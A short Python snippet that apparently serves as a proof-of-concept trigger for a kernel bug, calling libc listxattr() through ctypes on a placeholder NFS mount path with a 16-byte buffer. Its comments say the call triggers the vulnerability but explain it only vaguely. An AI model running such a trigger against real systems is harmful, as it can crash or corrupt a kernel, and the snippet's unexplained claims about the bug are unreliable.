```python
import ctypes

# Assume the following variables are defined appropriately
buffer_size = 16  # Size greater than 0
buffer = ctypes.create_string_buffer(buffer_size)

# Call to listxattr() that triggers the vulnerability
result = ctypes.CDLL('libc.so.6').listxattr('/path/to/nfs/mount', buffer, buffer_size)

# The result would be the size needed for the buffer, which can lead to the kernel bug
print("Result:", result)
